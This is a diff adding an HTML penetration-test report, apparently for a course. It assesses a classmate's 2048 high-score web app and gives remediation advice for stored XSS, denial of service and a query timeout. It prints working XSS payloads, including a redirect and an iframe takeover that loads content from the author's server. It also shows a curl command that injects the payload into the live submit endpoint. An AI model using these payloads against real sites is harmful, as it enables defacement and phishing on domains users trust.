@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+<title>2048 GameCenter Security Report</title>
+<link href="http://kevinburke.bitbucket.org/markdowncss/markdown.css" rel="stylesheet"></link>
+<link href="index.css" rel="stylesheet"></link>
+<meta charset="utf-8">
+</head>
+
+<body>
+<h1>Security Assessment of 2048 GameCenter</h1>
+<p>by Stephen Panaro</p>
+
+<h2>Introduction</h2>
+<p>The goal of this project is to penetration test a fellow student's 2048 GameCenter. 2048 GameCenter is a web application developed to meet the requirements of <a href="http://tuftsdev.github.io/WebProgramming/assignments/a4.html">COMP20 Assignment 4</a>. In short, the GameCenter accepts, stores and displays high scores from a <a href="http://gabrielecirulli.github.io/2048/">2048</a> game. It provides an API to submit and retrieve scores for a specific user and also serves a web page displaying the high scores in the GameCenter.</p>
+
+<p>I was assigned to test Siddhartha Prasad's implementation, hosted at <a href="http://ancient-crag-7837.herokuapp.com/">http://ancient-crag-7837.herokuapp.com/</a></p>
+
+<h2>Methodology</h2>
+<p>First "black box" testing was performed. This testing is performed from the perspective of a malicious hacker who does not have legitimate access to any of the systems or source code being attacked. First, common attack vectors were tried, including script injection.</p>
+
+<p>Next "white box" testing performed. This testing is performed by reviewing source code and application systems to look for potential weaknesses. Any insecurities that are discovered this way are then confirmed by using them against the actual application.</p>
+
+<h2>Abstract Findings</h2>
+<p>Two types of security vulnerabilities were discovered in the security review of this application. First, there are vulnerabilities that arise from putting too much faith in user input to the system being what it should be. As a result, a malicious attacker could use the service to do anything from displaying funny YouTube videos to hosting a phishing site to steal credentials. Second there are vulnerabilities that exploit the services poor ability to handle a lot of data. These vulnerabilities are less serious but could still cause the service to be unavailable to users, possibly resulting in a loss in users over time.</p>
+
+<h2>Issues Found</h2>
+
+<h3>1. Cross-Site Scripting</h3>
+
+<ul>
+	<li>Affects: GET on / Route and /scores.json Route</li>
+	<li>Severity: HIGH - This vulnerability allows arbitrary code to be executed on the / route as well as on any page that uses the /scores.json API without escaping the content. As demonstrated below this can even be extended to make an entirely different page appear on the GameCenter domain.</li>
+	<li><p>This issue was essentially found for me as Ming attacked Siddhartha's page before I got to it by inserting:</p>
+	<code>
+		&lt;script&gt;
+            window.location = "https://www.youtube.com/watch?v=b4810hS8weQ";
+        &lt;/script&gt;
+    </code>
+    <p>into one of the username fields by POSTing to /submit.json. Since this code redirects immediately to a Muppets' YouTube video, I was unable to easily view Siddhartha's leaderboard to see if my intrusion attempts were succeeding.</p>
+    <p>To circumvent this I inserted my own script:</p>
+
+<pre><code>
+&lt;script&gt;
+    $('head').append('&lt;link rel="stylesheet" href="http://www.eecs.tufts.edu/~spanar01/lol.css"&gt;');
+    document.body.innerHTML = '&lt;div id="content"&gt;&lt;iframe width="100%" height="100%" frameborder="0"
+                                src="http://www.eecs.tufts.edu/~spanar01/parser.html"&gt;&lt;/iframe&gt;&lt;/div&gt;';
+&lt;/script&gt;
+</code></pre>
+
+    <p>using curl:</p>
+    <code>$ curl --data "username=&lt;script&gt;...&lt;script&gt;&score=10000000&grid=x" http://ancient-crag-7837.herokuapp.com/submit.json</code>
+    <p>By submitting with a higher score than Ming's hack I ensured that my code would be executed before his redirect. I used this opportunity to replace the contents of &lt;body&gt; with an iframe pointing to a website that I control. I also inserted a link to a css file into the &lt;head&gt; of the document to make the iframe take up the whole page.</p>
+    <p>For now my website simply displays Siddhartha's scoreboard with offending javascript (like Ming's) stripped, but in the future it could display any page, as exemplified below.</p>
+    <img src="img/mysite-xss.png" alt="My personal website serving a modified version of Siddhartha's page.">
+    <img src="img/siddsite-xss.png" alt="Siddhartha's site displaying my modified web page in an iframe.">
+    <li>This vulnerability can be resolved by sanitizing any user input to the /submit.json API before inserting it into the database. Sanitization could be accomplished by custom code, but it is a better idea to use a pre-existing library that has been tested and used by the community. One potential candidate is <a href="https://github.com/chriso/validator.js">validator.js</a>. Additionally, access to the post API can be restricted to trusted 2048 clients (although API input should still be sanitized).</li>
+</ul>
+
+<h3>2. Denial of Service</h3>
+
+<ul>
+    <li>Affects: Entire Application</li>
+    <li>Severity: HIGH/MEDIUM - This vulnerability brings down the whole application, including POSTing new scores and GETting any sort of data. However, if you are aware that a DOS is the cause, in some cases it is preventable.</li>
+    <li>
+        <p>I found this vulnerability by writing a script that repeatedly POSTs a large amount of information (~1kB) to the /submit.json route. Running ~4 threads of this in parallel works for a while, but eventually crashes. This gives a 503 error (Service unavailable) on all endpoints, as seen below.
+        </p>
+        <img class="wide-image" src="img/dos-results.png" alt="All endpoints giving a 503 error after a POST spamming.">
+    </li>
+    <li>There are multiple ways to resolve this error. The main problem is that there are too many incoming requests for the application to process in a reasonable amount of time. If there is one malicious IP address performing the DOS, requests from that IP address can be ignored, freeing up resources for legitimate requests. Otherwise, horizontal scaling can be employed by adding more machines, or, in the case of Heroku, spinning up more dynos to deal with the increased load.</li>
+</ul>
+
+<h3> 3. Crash when retrieving a lot of scores for a user</h3>
+
+<ul>
+    <li>Affects: GET on /scores.json and / Routes</li>
+    <li>Severity: MEDIUM - This vulnerability does bring down two routes, but most API users will be using the /scores.json route for users that are not affected by this vulnerability. However, it will require a fair amount of work to fix.</li>
+    <li>
+    <p>I found this vulnerability as a side-effect of vulnerability 2. In the process of trying to fill up the Mongo database, I POSTed many scores with the same user. When trying to view the /scores.json endpoint for this user, the request timed out after 30 seconds with a 503 error. According to the Heroku documentation, 30 seconds is the maximum amount of time a request has to complete.
+    </p>
+    <img class="wide-image" src="img/scores-page-timeout.png" alt="Timeout when trying to get scores for a user with many scores.">
+    <p>Additionally, this also took down the / route. Both of these are likely caused by the use of .toArray() when querying Mongo because the toArray() method iterates through every matching document in the database.</p>
+    <img class="wide-image" src="img/main-page-timeout.png" alt="Timeout when requesting the main leaderboard page.">
+    <p>Note that the /submit.json route still works and the /scores.json route still works for other users.</p>
+    <img class="wide-image" src="img/scores-route-no-timeout.png">
+    </li>
+    <li>
+    <p>This vulnerability can be resolved by limiting the number of results returned from Mongo. A database re-architecting may be required to still display the scores in sorted order. This could potentially be accomplished by including a new unique and sortable key in each document or by adding a secondary index to allow easier querying based on score and or user. Maybe having the GameCenter only save the latest score for any given user/score combination would help.</p>
+    </li>
+</ul>
+
+<h2>Conclusion</h2>
+<p>
+Although this application has several weak points, all of them can be easily resolved, in the short term. The script injection vulnerability will only take a few lines of code and a quick fix to the other two would be limiting the number of scores for a given user in the database. In the long term a more robust database model will provide the security (against the second two issues) and the scalability needed for an application as popular as 2048. One further improvement would be limiting submissions to the API from trusted domains, in an effort to increase the validity of the high score leaderboard.
+</p>
+<p>With some work, this could become a successful and popular application.</p>
+</body>
+
+</html>
